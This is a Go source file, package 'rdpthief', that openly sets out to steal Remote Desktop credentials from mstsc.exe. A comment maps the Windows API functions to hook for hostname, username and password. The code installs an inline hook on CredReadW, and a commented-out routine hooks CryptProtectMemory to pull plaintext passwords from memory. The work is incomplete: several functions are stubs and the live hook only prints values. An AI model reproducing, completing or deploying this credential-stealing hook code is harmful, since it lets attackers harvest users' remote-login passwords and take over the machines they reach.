package rdpthief

import (
	"fmt"
	"sync"
	"unsafe"

	"github.com/pkg/errors"
	"golang.org/x/sys/windows"

	"project/internal/module/windows/hook"
)

// hook list
// sechost.dll   CredReadW                   --- get hostname
// sechost.dll   CredIsMarshaledCredentialW  --- get username
// crypt32.dll   CryptProtectMemory          --- get password

// Credential is the credential that stolen from mstsc.exe.
type Credential struct {
	Hostname string
	Username string
	Password string
}

// Hook is the core library for steal credential.
type Hook struct {
	hostname string
	username string
	password string

	pgCredReadW *hook.PatchGuard

	mu sync.Mutex
}

// Install is used to install hook.
func (h *Hook) Install() error {
	pg, err := hook.NewInlineHookByName("sechost.dll", "CredReadW", true, h.credReadW)
	if err != nil {
		return errors.WithMessage(err, "failed to install hook about CredReadW")
	}

	h.pgCredReadW = pg

	return nil
}

// Uninstall is used to uninstall hook.
func (h *Hook) Uninstall() error {
	return nil
}

func (h *Hook) credReadW(targetName *uint16, typ uint, flags uint, cred uintptr) uintptr {
	hostname := windows.UTF16PtrToString(targetName)

	fmt.Println(hostname)
	fmt.Println(typ)
	fmt.Println(flags)
	fmt.Println(cred)

	ret, _, _ := h.pgCredReadW.Original.Call(
		uintptr(unsafe.Pointer(targetName)), uintptr(typ), uintptr(flags), cred,
	)
	fmt.Println(ret)
	return 123
}

// ReadCredentials is used to read credentials from mstsc.exe.
func ReadCredentials(pid uint32) ([]*Credential, error) {
	return nil, nil
}

// func hookFn(address *byte, size uint32, flags uint32) uintptr {
//	// skip data that not contain password
//	if *address == 2 && size != 16 {
//		hook.Close()
//
//		ret, _, _ := target.Call(uintptr(unsafe.Pointer(address)), uintptr(size), uintptr(flags))
//
//		var err error
//		arch, _ := hinako.NewRuntimeArch()
//		hook, err = hinako.NewHookByName(arch, "Crypt32.dll", "CryptProtectMemory", hookFn)
//		if err != nil {
//			log.Fatalf("failed to hook MessageBoxW: %+v", err)
//		}
//
//		// ret, _, _ := target.Call(uintptr(unsafe.Pointer(address)), uintptr(size), uintptr(flags))
//		return ret
//	}
//
//	var data []byte
//
//	dataSH := (*reflect.SliceHeader)(unsafe.Pointer(&data))
//	dataSH.Data = uintptr(unsafe.Pointer(address))
//	dataSH.Len = int(size)
//	dataSH.Cap = int(size)
//
//	// a := syscall.StringToUTF16Ptr(string(data))
//	// b := syscall.StringToUTF16Ptr(string(data))
//
//	ss := convert.LEBytesToUint32(data[:4])
//
//	password := data[4 : 4+int(ss)]
//
//	// 	_, _, _ = msgbox.Call(0, uintptr(unsafe.Pointer(a)), uintptr(unsafe.Pointer(b)), 0)
//	msgbox.Call(0, uintptr(unsafe.Pointer(&password[0])), wstrPtr("password"), 0)
//	// fmt.Println("receive data:", data)
//	// fmt.Println(flags)
//
//	// fmt.Println(hWnd, lpText, lpCaption, uType)
//	//
//	// ptr1, _ := syscall.UTF16PtrFromString("hooked!")
//	// ptr2, _ := syscall.UTF16PtrFromString("hooked222!")
//	//
//	// fmt.Println("data2:", *(*[16]byte)(unsafe.Pointer(originalMessageBoxW.Addr())))
//	//
//	hook.Close()
//
//	ret, _, _ := target.Call(uintptr(unsafe.Pointer(address)), uintptr(size), uintptr(flags))
//
//	var err error
//	arch, _ := hinako.NewRuntimeArch()
//	hook, err = hinako.NewHookByName(arch, "Crypt32.dll", "CryptProtectMemory", hookFn)
//	if err != nil {
//		log.Fatalf("failed to hook MessageBoxW: %+v", err)
//	}
//
//	// fmt.Println(r)
//	return ret
// }
